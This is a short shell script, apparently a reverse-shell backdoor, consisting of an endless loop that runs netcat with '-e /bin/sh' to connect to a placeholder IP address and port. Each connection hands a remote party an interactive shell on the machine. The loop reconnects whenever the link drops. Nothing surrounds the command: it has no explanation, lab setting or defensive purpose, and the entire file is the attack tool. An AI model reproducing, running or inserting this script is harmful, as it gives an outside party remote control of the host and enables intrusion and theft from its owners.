#!/bin/sh

while true; do
    nc <ip-address> <port> -e /bin/sh
done
